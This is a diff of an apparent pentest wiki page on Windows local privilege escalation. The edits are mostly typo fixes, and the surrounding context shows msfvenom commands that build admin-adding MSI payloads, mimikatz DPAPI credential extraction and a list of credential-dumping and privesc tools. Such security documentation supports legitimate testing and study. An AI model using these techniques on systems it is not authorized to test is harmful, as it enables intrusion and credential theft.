@@ -4,11 +4,13 @@
 
 ### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
+This page consolidates general Windows privilege-escalation methodology from several foundational guides.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Its practical enumeration flow also draws on community workshops and checklists.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> The historical attack material includes the DerbyCon presentation on Windows privilege escalation.<sup>[[5]](#references)</sup>
+
 ## Initial Windows Theory
 
 ### Access Tokens
 
-**If you don't know what are Windows Access Tokens, read the following page before continuing:**
+**If you don't know what Windows access tokens are, read the following page before continuing:**
 
 
 {{#ref}}
@@ -26,7 +28,7 @@ acls-dacls-sacls-aces.md
 
 ### Integrity Levels
 
-**If you don't know what are integrity levels in Windows you should read the following page before continuing:**
+**If you don't know what integrity levels are in Windows, read the following page before continuing:**
 
 
 {{#ref}}
@@ -290,7 +292,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 ```bash
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
-msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
 ```
 
 If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
@@ -393,7 +395,7 @@ reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 
 ### Credentials Guard
 
-**Credential Guard** wasn introduced in **Windows 10**. Its purpose is to safeguard the credentials stored on a device against threats like pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** was introduced in **Windows 10**. Its purpose is to safeguard credentials stored on a device against threats such as pass-the-hash attacks. [**More information about Credential Guard is available here.**](../stealing-credentials/credentials-protections.md#credential-guard)
 
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
@@ -570,7 +572,7 @@ accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
 accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 ```
 
-[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
+[You can download accesschk.exe for XP from here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
 
 ### Enable service
 
@@ -1134,7 +1136,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 ### Credentials manager / Windows vault
 
 From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
-The Windows Vault stores user credentials for servers, websites and other programs that **Windows** can **log in the users automaticall**y. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.
+Windows Vault stores user credentials for servers, websites, and other programs that **Windows** can use to **log users in automatically**. At first, this might sound as though users can store credentials for sites such as Facebook, Twitter, or Gmail and have browsers log in automatically, but that is not how it works.
 
 Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.
 
@@ -1198,7 +1200,7 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
 
-You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
+You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
 You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).
 
 
@@ -1458,7 +1460,7 @@ AppData\Roaming\gcloud\access_tokens.db
 
 Search for a file called **SiteList.xml**
 
-### Cached GPP Pasword
+### Cached GPP Password
 
 A feature was previously available that allowed the deployment of custom local administrator accounts on a group of machines via Group Policy Preferences (GPP). However, this method had significant security flaws. Firstly, the Group Policy Objects (GPOs), stored as XML files in SYSVOL, could be accessed by any domain user. Secondly, the passwords within these GPPs, encrypted with AES256 using a publicly documented default key, could be decrypted by any authenticated user. This posed a serious risk, as it could allow users to gain elevated privileges.
 
@@ -2121,7 +2123,7 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 [**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
 [**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
-[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
+[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts credentials from Credential Manager. Detected.**\
 [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
 [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
 [**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
@@ -2132,7 +2134,7 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 
 [**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
 [**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of software (precompiled exe in github)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
 [~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
 [~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.
@@ -2144,7 +2146,7 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 **Local**
 
 [**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)
+[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** and recommends working exploits (local Python)
 
 **Meterpreter**
 
